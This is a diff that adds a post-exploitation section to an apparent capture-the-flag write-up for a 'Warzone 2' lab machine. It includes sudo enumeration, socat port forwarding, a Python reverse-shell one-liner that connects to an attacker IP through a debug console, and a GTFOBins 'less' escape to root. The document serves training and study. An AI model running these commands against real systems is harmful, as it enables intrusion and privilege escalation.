@@ -109,8 +109,50 @@ Now we have a good shell and ssh access.
 
 ## Post exploitation
 
+`sudo -l` will show you admiral wrz2-app.py execute permission which is similiar to server from previous machine Warzone 1
+```
+sudo -u admiral /usr/bin/python3 /home/admiral/warzone2-app/wrz2-app.py
+```
+Then you will see the PIN to console on web server. It was not available in previous server because you can see it only on the server side.
+Also, the app shows you that it is running on 127.0.0.1:5000 which is local service.
+
+### Port forwarding
+
+I used socat as flagman:
+```
+socat TCP-LISTEN:8080, fork TCP:127.0.0.1:5000
+```
+
+Then go to attack-machine:8080 and you will get the available service.
+
+### /console
+
+In console, we can execute whatevere we want with python. So execute a reverse shell with open nc server:
+```
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.88.225",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+```
+Got admiral.
+
+### root
+
+`sudo -l will` show you that you can execute less and see the content of warzone-rules.txt
+
+with GTFOBins you can easily get a root:
+```
+sudo -u root /usr/bin/less /var/public/warzone-rules.txt
+!/bin/sh
+```
+
 ## Sources
 
 ### Flag semaphore
 
 [wiki](https://en.wikipedia.org/wiki/Flag_semaphore "https://en.wikipedia.org/wiki/Flag_semaphore")
+
+### Port forwarding with socat
+
+[port forwarding](https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https "https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https")
+
+### GTFOBins
+
+[shell with less binary](https://gtfobins.github.io/gtfobins/less/#shell "https://gtfobins.github.io/gtfobins/less/#shell")
